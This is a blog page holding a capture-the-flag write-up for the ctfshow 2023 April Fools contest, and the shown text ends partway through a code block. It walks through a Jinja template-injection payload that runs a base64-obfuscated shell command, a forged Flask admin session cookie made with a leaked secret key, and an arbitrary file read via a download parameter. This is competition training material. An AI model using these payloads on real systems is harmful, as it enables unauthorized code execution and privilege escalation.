@@ -1,0 +1,1448 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="ezssti 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from flask import render_template_string,render_template app = Flask(__name__) @app.route('/hello/') def hello(name=None): return render_template('hello.html',name=name) @app.route('/hello/<name>') def hellodear(name): if &#34;ge&#34; in name: return render_template_string('hello %s' % name) elif &#34;f&#34; not in name: return render_template_string('hello %s' % name) else: return 'Nonononon' 测试出来传参方式之后发现/过滤了 然后我们就直接base64绕过吧\n1 url/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('echo dGFjIC9mKg==|base64 -d|sh').read()}} easy_signin url里面参数很明显但是试了filter协议和flag.php都不行，那看看源码(访问/index.php)\n1 https://b64cd330-9b26-4861-9b2c-67fa244be165.challenge.ctf.show/?img=aW5kZXgucGhw 发现一个图片无法显示,查看源代码解码得到flag\neasy_flask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 # app.py from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response app = Flask(__name__) app.secret_key = 'S3cr3tK3y' users = { } @app.route('/') def index(): # Check if user is loggedin if 'loggedin' in session: return redirect(url_for('profile')) return redirect(url_for('login')) @app.route('/login/', methods=['GET', 'POST']) def login(): msg = '' if request.method == 'POST' and 'username' in request.form and 'password' in request.form: username = request.form['username'] password = request.form['password'] if username in users and password == users[username]['password']: session['loggedin'] = True session['username'] = username session['role'] = users[username]['role'] return redirect(url_for('profile')) else: msg = 'Incorrect username/password!' return render_template('login.html', msg=msg) @app.route('/register/', methods=['GET', 'POST']) def register(): msg = '' if request.method == 'POST' and 'username' in request.form and 'password' in request.form: username = request.form['username'] password = request.form['password'] if username in users: msg = 'Account already exists!' else: users[username] = {'password': password, 'role': 'user'} msg = 'You have successfully registered!' return render_template('register.html', msg=msg) @app.route('/profile/') def profile(): if 'loggedin' in session: return render_template('profile2.html', username=session['username'], role=session['role']) return redirect(url_for('login')) ........ 给了个密钥那肯定是要修改session为admin\n"><title>ctfshow2023愚人杯</title><link rel=canonical href=https://baozongwi.xyz/p/ctfshow-2023-april-fools-cup/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="ctfshow2023愚人杯"><meta property='og:description' content="ezssti 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from flask import render_template_string,render_template app = Flask(__name__) @app.route('/hello/') def hello(name=None): return render_template('hello.html',name=name) @app.route('/hello/<name>') def hellodear(name): if &#34;ge&#34; in name: return render_template_string('hello %s' % name) elif &#34;f&#34; not in name: return render_template_string('hello %s' % name) else: return 'Nonononon' 测试出来传参方式之后发现/过滤了 然后我们就直接base64绕过吧\n1 url/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('echo dGFjIC9mKg==|base64 -d|sh').read()}} easy_signin url里面参数很明显但是试了filter协议和flag.php都不行，那看看源码(访问/index.php)\n1 https://b64cd330-9b26-4861-9b2c-67fa244be165.challenge.ctf.show/?img=aW5kZXgucGhw 发现一个图片无法显示,查看源代码解码得到flag\neasy_flask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 # app.py from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response app = Flask(__name__) app.secret_key = 'S3cr3tK3y' users = { } @app.route('/') def index(): # Check if user is loggedin if 'loggedin' in session: return redirect(url_for('profile')) return redirect(url_for('login')) @app.route('/login/', methods=['GET', 'POST']) def login(): msg = '' if request.method == 'POST' and 'username' in request.form and 'password' in request.form: username = request.form['username'] password = request.form['password'] if username in users and password == users[username]['password']: session['loggedin'] = True session['username'] = username session['role'] = users[username]['role'] return redirect(url_for('profile')) else: msg = 'Incorrect username/password!' return render_template('login.html', msg=msg) @app.route('/register/', methods=['GET', 'POST']) def register(): msg = '' if request.method == 'POST' and 'username' in request.form and 'password' in request.form: username = request.form['username'] password = request.form['password'] if username in users: msg = 'Account already exists!' else: users[username] = {'password': password, 'role': 'user'} msg = 'You have successfully registered!' return render_template('register.html', msg=msg) @app.route('/profile/') def profile(): if 'loggedin' in session: return render_template('profile2.html', username=session['username'], role=session['role']) return redirect(url_for('login')) ........ 给了个密钥那肯定是要修改session为admin\n"><meta property='og:url' content='https://baozongwi.xyz/p/ctfshow-2023-april-fools-cup/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='ssti'><meta property='article:published_time' content='2024-08-08T17:32:43+00:00'><meta property='article:modified_time' content='2024-08-08T17:32:43+00:00'><meta name=twitter:title content="ctfshow2023愚人杯"><meta name=twitter:description content="ezssti 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from flask import render_template_string,render_template app = Flask(__name__) @app.route('/hello/') def hello(name=None): return render_template('hello.html',name=name) @app.route('/hello/<name>') def hellodear(name): if &#34;ge&#34; in name: return render_template_string('hello %s' % name) elif &#34;f&#34; not in name: return render_template_string('hello %s' % name) else: return 'Nonononon' 测试出来传参方式之后发现/过滤了 然后我们就直接base64绕过吧\n1 url/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('echo dGFjIC9mKg==|base64 -d|sh').read()}} easy_signin url里面参数很明显但是试了filter协议和flag.php都不行，那看看源码(访问/index.php)\n1 https://b64cd330-9b26-4861-9b2c-67fa244be165.challenge.ctf.show/?img=aW5kZXgucGhw 发现一个图片无法显示,查看源代码解码得到flag\neasy_flask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 # app.py from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response app = Flask(__name__) app.secret_key = 'S3cr3tK3y' users = { } @app.route('/') def index(): # Check if user is loggedin if 'loggedin' in session: return redirect(url_for('profile')) return redirect(url_for('login')) @app.route('/login/', methods=['GET', 'POST']) def login(): msg = '' if request.method == 'POST' and 'username' in request.form and 'password' in request.form: username = request.form['username'] password = request.form['password'] if username in users and password == users[username]['password']: session['loggedin'] = True session['username'] = username session['role'] = users[username]['role'] return redirect(url_for('profile')) else: msg = 'Incorrect username/password!' return render_template('login.html', msg=msg) @app.route('/register/', methods=['GET', 'POST']) def register(): msg = '' if request.method == 'POST' and 'username' in request.form and 'password' in request.form: username = request.form['username'] password = request.form['password'] if username in users: msg = 'Account already exists!' else: users[username] = {'password': password, 'role': 'user'} msg = 'You have successfully registered!' return render_template('register.html', msg=msg) @app.route('/profile/') def profile(): if 'loggedin' in session: return render_template('profile2.html', username=session['username'], role=session['role']) return redirect(url_for('login')) ........ 给了个密钥那肯定是要修改session为admin\n"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctfshow/>Ctfshow</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ctfshow-2023-april-fools-cup/>ctfshow2023愚人杯</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-08-08T17:32:43Z>Aug 08, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>11 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 552 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=ezssti>ezssti</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>render_template_string</span><span class=p>,</span><span class=n>render_template</span>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/hello/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello</span><span class=p>(</span><span class=n>name</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;hello.html&#39;</span><span class=p>,</span><span class=n>name</span><span class=o>=</span><span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/hello/&lt;name&gt;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hellodear</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;ge&#34;</span> <span class=ow>in</span> <span class=n>name</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s1>&#39;hello </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=s2>&#34;f&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>name</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s1>&#39;hello </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Nonononon&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>测试出来传参方式之后发现<code>/</code>过滤了
+然后我们就直接base64绕过吧</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url/hello/{{g.pop.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;echo dGFjIC9mKg==|base64 -d|sh&#39;).read()}}
+</span></span></code></pre></td></tr></table></div></div><h1 id=easy_signin>easy_signin</h1><p><code>url</code>里面参数很明显但是试了<code>filter</code>协议和<code>flag.php</code>都不行，那看看源码(访问<code>/index.php</code>)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://b64cd330-9b26-4861-9b2c-67fa244be165.challenge.ctf.show/?img=aW5kZXgucGhw
+</span></span></code></pre></td></tr></table></div></div><p>发现一个图片无法显示,查看源代码解码得到flag</p><h1 id=easy_flask>easy_flask</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># app.py
+</span></span><span class=line><span class=cl>from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>app = Flask(__name__)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>app.secret_key = &#39;S3cr3tK3y&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>users = {
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route(&#39;/&#39;)
+</span></span><span class=line><span class=cl>def index():
+</span></span><span class=line><span class=cl># Check if user is loggedin
+</span></span><span class=line><span class=cl>if &#39;loggedin&#39; in session:
+</span></span><span class=line><span class=cl>return redirect(url_for(&#39;profile&#39;))
+</span></span><span class=line><span class=cl>return redirect(url_for(&#39;login&#39;))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route(&#39;/login/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+</span></span><span class=line><span class=cl>def login():
+</span></span><span class=line><span class=cl>msg = &#39;&#39;
+</span></span><span class=line><span class=cl>if request.method == &#39;POST&#39; and &#39;username&#39; in request.form and &#39;password&#39; in request.form:
+</span></span><span class=line><span class=cl>username = request.form[&#39;username&#39;]
+</span></span><span class=line><span class=cl>password = request.form[&#39;password&#39;]
+</span></span><span class=line><span class=cl>if username in users and password == users[username][&#39;password&#39;]:
+</span></span><span class=line><span class=cl>session[&#39;loggedin&#39;] = True
+</span></span><span class=line><span class=cl>session[&#39;username&#39;] = username
+</span></span><span class=line><span class=cl>session[&#39;role&#39;] = users[username][&#39;role&#39;]
+</span></span><span class=line><span class=cl>return redirect(url_for(&#39;profile&#39;))
+</span></span><span class=line><span class=cl>else:
+</span></span><span class=line><span class=cl>msg = &#39;Incorrect username/password!&#39;
+</span></span><span class=line><span class=cl>return render_template(&#39;login.html&#39;, msg=msg)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route(&#39;/register/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+</span></span><span class=line><span class=cl>def register():
+</span></span><span class=line><span class=cl>msg = &#39;&#39;
+</span></span><span class=line><span class=cl>if request.method == &#39;POST&#39; and &#39;username&#39; in request.form and &#39;password&#39; in request.form:
+</span></span><span class=line><span class=cl>username = request.form[&#39;username&#39;]
+</span></span><span class=line><span class=cl>password = request.form[&#39;password&#39;]
+</span></span><span class=line><span class=cl>if username in users:
+</span></span><span class=line><span class=cl>msg = &#39;Account already exists!&#39;
+</span></span><span class=line><span class=cl>else:
+</span></span><span class=line><span class=cl>users[username] = {&#39;password&#39;: password, &#39;role&#39;: &#39;user&#39;}
+</span></span><span class=line><span class=cl>msg = &#39;You have successfully registered!&#39;
+</span></span><span class=line><span class=cl>return render_template(&#39;register.html&#39;, msg=msg)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route(&#39;/profile/&#39;)
+</span></span><span class=line><span class=cl>def profile():
+</span></span><span class=line><span class=cl>if &#39;loggedin&#39; in session:
+</span></span><span class=line><span class=cl>return render_template(&#39;profile2.html&#39;, username=session[&#39;username&#39;], role=session[&#39;role&#39;])
+</span></span><span class=line><span class=cl>return redirect(url_for(&#39;login&#39;))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>........
+</span></span></code></pre></td></tr></table></div></div><p>给了个密钥那肯定是要修改session为admin</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZrDMlg.Ekl2r4BVVam_XXf--rWyoaDaNHk
+</span></span></code></pre></td></tr></table></div></div><p>有个一个开源脚本<code>flask_session_cookie_manager3.py</code>可以直接修改flask的cookie值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 flask_session_cookie_manager3.py decode -c &#39;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZrDMlg.Ekl2r4BVVam_XXf--rWyoaDaNHk&#39; -s &#39;S3cr3tK3y&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{&#39;loggedin&#39;: True, &#39;role&#39;: &#39;user&#39;, &#39;username&#39;: &#39;123&#39;}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python3 flask_session_cookie_manager3.py encode -t &#34;{&#39;loggedin&#39;: True, &#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;123&#39;}&#34; -s &#39;S3cr3tK3y&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxMjMifQ.ZrDRUg.t7_WdrPpPdMtEAnjypjXyH8FSwU
+</span></span></code></pre></td></tr></table></div></div><p>伪造cookie之后,查看源代码发现有个任意文件读取漏洞</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=mi>5</span><span class=n>d9ac37c</span><span class=o>-</span><span class=n>eb1a</span><span class=o>-</span><span class=mi>465</span><span class=n>c</span><span class=o>-</span><span class=n>b756</span><span class=o>-</span><span class=mi>266</span><span class=n>b55182087</span><span class=o>.</span><span class=n>challenge</span><span class=o>.</span><span class=n>ctf</span><span class=o>.</span><span class=n>show</span><span class=o>/</span><span class=n>download</span><span class=o>/</span><span class=err>?</span><span class=n>filename</span><span class=o>=</span><span class=n>app</span><span class=o>.</span><span class=n>py</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
